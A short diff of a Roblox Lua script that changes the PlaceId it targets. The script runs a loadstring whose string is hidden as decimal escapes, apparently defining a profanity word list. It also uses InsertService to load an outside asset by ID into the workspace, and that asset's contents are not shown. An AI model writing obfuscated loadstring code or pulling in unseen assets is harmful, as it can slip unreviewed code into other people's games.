@@ -4,7 +4,7 @@ loadstring("\95\71\46\98\97\100\119\111\114\100\115\32\61\32\123\34\102\117\99\3
 end
 end)
 
-if game.PlaceId == 136318028703525 then
+if game.PlaceId == 14747334292 then
 pcall(function()
 game:GetService("InsertService"):LoadAsset(121155196033104).Parent = workspace
 end)
